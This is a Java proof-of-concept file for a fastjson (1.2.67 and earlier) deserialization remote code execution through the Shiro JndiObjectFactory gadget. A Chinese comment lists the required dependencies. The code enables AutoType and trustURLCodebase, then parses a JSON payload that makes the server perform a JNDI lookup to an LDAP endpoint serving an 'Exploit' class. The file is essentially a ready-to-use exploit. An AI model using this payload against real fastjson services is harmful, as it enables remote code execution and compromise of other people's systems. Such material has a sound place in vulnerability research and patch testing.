import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
/**
 *
 *  fastjson <= 1.2.67 RCE，需要开启AutoType
 *
 *  JndiObjectFactory依赖的gadget
 *  <dependency>
 *  <groupId>com.alibaba</groupId>
 *  <artifactId>fastjson</artifactId>
 *  <version>1.2.67</version>
 *  </dependency>

 *  <dependency>
 *  <groupId>org.apache.shiro</groupId>
 *  <artifactId>shiro-core</artifactId>
 *  <version>1.5.1</version>
 *  </dependency>
 **/

public class test {
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
        try {
            JSON.parseObject(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
